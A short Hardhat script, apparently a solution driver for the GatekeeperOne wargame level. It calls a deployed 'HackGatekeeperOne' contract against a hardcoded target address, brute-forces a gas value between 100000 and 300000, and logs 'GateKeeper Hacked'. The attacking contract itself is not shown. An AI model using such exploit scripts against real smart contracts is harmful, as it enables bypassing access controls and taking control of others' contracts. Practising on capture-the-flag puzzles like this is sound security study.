const { ethers, network } = require("hardhat")

async function hack() {
    const hackGatekeeper = await ethers.getContract("HackGatekeeperOne")
    const gateKeeperOneAddress = "0x6302DA3A44c6af01C1e0Da8A99057a68Cdf0D392"
    const lowergas = 100000
    const highergas = 300000
    const hackTx = await hackGatekeeper.hack(gateKeeperOneAddress, lowergas, highergas)
    const mintTxReceipt = await hackTx.wait(1)
    console.log(`${(mintTxReceipt.events[0].args.gasBrute).toNumber()}`)
    console.log("GateKeeper Hacked")
   
}

hack()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    })
